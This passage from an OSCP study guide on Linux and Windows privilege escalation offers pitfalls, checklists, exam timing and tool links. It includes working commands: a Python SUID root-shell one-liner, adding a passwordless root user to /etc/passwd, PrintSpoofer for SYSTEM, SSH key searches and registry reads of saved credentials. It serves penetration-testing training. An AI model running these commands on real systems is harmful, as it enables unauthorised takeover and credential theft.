| **Easiest Win** | sudo -l | SeImpersonatePrivilege |
| **File System** | World-readable, clear permissions | ACLs, complex permissions |
| **Tools** | GTFOBins for SUID/sudo | PrintSpoofer for tokens |
| **Documentation** | Man pages, source code | Sysinternals, MSDN |
| **Exploit Availability** | Many public exploits | Fewer, more OS-version specific |

**Pentester's Approach**:
- **Linux**: Start with `sudo -l`, then SUID, then automated enum
- **Windows**: Start with `whoami /priv` (check for SeImpersonate), then services, then automated enum

**For OSCP**:
- Both require **thorough enumeration**
- Don't jump to kernel exploits
- Understand **WHY** a misconfiguration is exploitable, not just **HOW** to exploit it

---

## 📚 9. Common Pitfalls

### Linux Pitfalls

**Pitfall 1: Not checking sudo -l first**
```bash
# Many students spend 1 hour enumerating
# When they could have just checked:
sudo -l
# Output: (root) NOPASSWD: /usr/bin/vim
# → Instant root with GTFOBins
```

**Pitfall 2: Forgetting SUID binaries need to be EXECUTED**
```bash
# ❌ WRONG
find / -perm -4000 2>/dev/null
# Found /usr/bin/python3.9
# Student: "Cool, found SUID!" (but does nothing)

# ✅ CORRECT
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Actually exploit it!
```

**Pitfall 3: Not waiting for cron jobs**
```bash
# Student modifies cron script, waits 30 seconds
# "It didn't work!"
# Cron job runs every hour → Need to wait up to 60 minutes
# Use pspy64 to monitor in real-time
```

### Windows Pitfalls

**Pitfall 1: Not checking whoami /priv**
```cmd
REM First command after getting shell should be:
whoami /priv

REM SeImpersonatePrivilege = instant SYSTEM (PrintSpoofer)
REM But many students forget to check!
```

**Pitfall 2: Wrong PrintSpoofer syntax**
```cmd
REM ❌ WRONG (doesn't give you shell)
PrintSpoofer.exe

REM ✅ CORRECT
PrintSpoofer.exe -i -c cmd
                 ↑   ↑
          Interactive  Command to run
```

**Pitfall 3: Forgetting to use absolute paths**
```cmd
REM ❌ WRONG (might not work from current directory)
ps.exe -i -c cmd

REM ✅ CORRECT
C:\Users\Public\ps.exe -i -c cmd
```

---

## 🎯 10. Quick Reference Cheat Sheets

### Linux PrivEsc Cheat Sheet

```bash
# ══════════════════════════════════════════════════════════
# LINUX PRIVILEGE ESCALATION CHECKLIST
# ══════════════════════════════════════════════════════════

# ──────────────────────────────────────────────────────────
# 1. SUDO (Highest Priority - Check First!)
# ──────────────────────────────────────────────────────────
sudo -l
# If you see (root) NOPASSWD: → GTFOBins!

# ──────────────────────────────────────────────────────────
# 2. SUID BINARIES
# ──────────────────────────────────────────────────────────
find / -perm -4000 -type f 2>/dev/null
# Check each against GTFOBins

# ──────────────────────────────────────────────────────────
# 3. CAPABILITIES
# ──────────────────────────────────────────────────────────
getcap -r / 2>/dev/null
# Look for cap_setuid, cap_dac_override

# ──────────────────────────────────────────────────────────
# 4. CRON JOBS
# ──────────────────────────────────────────────────────────
cat /etc/crontab
ls -la /etc/cron.*
pspy64  # Monitor processes

# ──────────────────────────────────────────────────────────
# 5. WRITABLE /etc/passwd
# ──────────────────────────────────────────────────────────
ls -la /etc/passwd
# If writable: echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd

# ──────────────────────────────────────────────────────────
# 6. SSH KEYS
# ──────────────────────────────────────────────────────────
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# ──────────────────────────────────────────────────────────
# 7. AUTOMATED ENUMERATION
# ──────────────────────────────────────────────────────────
./linpeas.sh
./lse.sh -l 2

# ──────────────────────────────────────────────────────────
# 8. KERNEL EXPLOITS (Last Resort!)
# ──────────────────────────────────────────────────────────
uname -a
./linux-exploit-suggester.sh
```

### Windows PrivEsc Cheat Sheet

```cmd
REM ═══════════════════════════════════════════════════════════
REM WINDOWS PRIVILEGE ESCALATION CHECKLIST
REM ═══════════════════════════════════════════════════════════

REM ──────────────────────────────────────────────────────────
REM 1. TOKEN PRIVILEGES (Highest Priority!)
REM ──────────────────────────────────────────────────────────
whoami /priv
REM SeImpersonatePrivilege = PrintSpoofer/JuicyPotato

REM ──────────────────────────────────────────────────────────
REM 2. SERVICES
REM ──────────────────────────────────────────────────────────
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
wmic service list brief

REM ──────────────────────────────────────────────────────────
REM 3. ALWAYSINSTALLELEVATED
REM ──────────────────────────────────────────────────────────
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM ──────────────────────────────────────────────────────────
REM 4. SAVED CREDENTIALS
REM ──────────────────────────────────────────────────────────
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

REM ──────────────────────────────────────────────────────────
REM 5. SCHEDULED TASKS
REM ──────────────────────────────────────────────────────────
schtasks /query /fo LIST /v

REM ──────────────────────────────────────────────────────────
REM 6. UNQUOTED SERVICE PATHS
REM ──────────────────────────────────────────────────────────
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

REM ──────────────────────────────────────────────────────────
REM 7. AUTOMATED ENUMERATION
REM ──────────────────────────────────────────────────────────
winpeas.exe
.\PowerUp.ps1; Invoke-AllChecks

REM ──────────────────────────────────────────────────────────
REM 8. KERNEL EXPLOITS (Last Resort!)
REM ──────────────────────────────────────────────────────────
systeminfo
Watson.exe
```

---

## 🏆 11. OSCP Exam Strategy

### Time Management for PrivEsc

**Per Machine (Max 2 hours for PrivEsc)**:

- **0-10 min**: Quick wins (sudo -l, whoami /priv, automated enum)
- **10-30 min**: Thorough manual enumeration
- **30-60 min**: Test findings, exploit attempts
- **60-90 min**: Deep dive, custom exploits
- **90-120 min**: Kernel exploits (if desperate)

**If stuck at 2 hours**: Move to next machine, come back later with fresh eyes.

### PrivEsc Priority Order

**Linux**:
1. `sudo -l` → GTFOBins (5 min)
2. SUID binaries (10 min)
3. Capabilities (5 min)
4. Cron jobs with pspy (20 min)
5. Writable files (15 min)
6. LinPEAS automated (10 min)
7. Manual deep enum (30 min)
8. Kernel exploits (last resort)

**Windows**:
1. `whoami /priv` → PrintSpoofer if SeImpersonate (5 min)
2. Services (15 min)
3. AlwaysInstallElevated (2 min)
4. Scheduled tasks (10 min)
5. WinPEAS automated (10 min)
6. Saved credentials (15 min)
7. Kernel exploits (last resort)

### Practice Recommendations

**Before OSCP Exam**:
- Practice 50+ PrivEsc machines (HackTheBox, TryHackMe, VulnHub)
- Can you escalate a Linux box in <15 minutes?
- Can you escalate a Windows box in <20 minutes?
- Memorize the cheat sheets above

**HackTheBox Machines for PrivEsc Practice**:
- **Linux**: Lame, Beep, Bashed, Nibbles, Shocker
- **Windows**: Devel, Optimum, Blue, Jeeves, Bounty

---

## 📖 12. References & Resources

### Essential Tools (Download Before OSCP Exam)

**Linux**:
- LinPEAS: https://github.com/carlospolop/PEASS-ng/releases
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- pspy: https://github.com/DominicBreuker/pspy

**Windows**:
- WinPEAS: https://github.com/carlospolop/PEASS-ng/releases
- PrintSpoofer: https://github.com/itm4n/PrintSpoofer
- JuicyPotato: https://github.com/ohpe/juicy-potato
- PowerUp: https://github.com/PowerShellMafia/PowerSploit
- Watson: https://github.com/rasta-mouse/Watson
- Seatbelt: https://github.com/GhostPack/Seatbelt

### Learning Resources

**Books**:
- "Linux Privilege Escalation for OSCP & Beyond" - TJ Null
- "Windows Privilege Escalation" - Frizz

**Websites**:
- GTFOBins: https://gtfobins.github.io/ (Linux SUID/sudo)
- LOLBAS: https://lolbas-project.github.io/ (Windows LOL binaries)
- HackTricks PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

**Practice Platforms**:
- TryHackMe: "Linux PrivEsc" room
- TryHackMe: "Windows PrivEsc" room
- HackTheBox: Retired easy/medium boxes
- PG Practice: OSCP-like machines

---

## 🎖️ Final Advice for OSCP

**Mindset**:
- PrivEsc is NOT about memorizing exploits
- It's about **systematic enumeration** and **understanding misconfigurations**
- Every OSCP machine has a PrivEsc path that doesn't require kernel exploits

**Common Student Mistakes**:
1. Skipping enumeration and jumping to exploits
2. Not checking sudo -l / whoami /priv first
3. Giving up after 30 minutes ("I can't find anything!")
4. Using kernel exploits before trying everything else

**Success Formula**:
1. **Enumerate thoroughly** (don't skip steps!)
2. **Understand the vulnerability** (why is this exploitable?)
3. **Test methodically** (one thing at a time)
4. **Document everything** (for your report)

**Remember**: In the OSCP exam, the PrivEsc vector is ALWAYS there. You just need to find it. Be patient, be thorough, and trust the process.

---

**Good luck, and may you always escalate to root! 🚀**

---

**Document Version**: 1.0
**Last Updated**: January 2024
**Target Audience**: OSCP candidates & fresh security graduates
**Estimated Study Time**: 40-50 hours for OSCP mastery

# End of Document
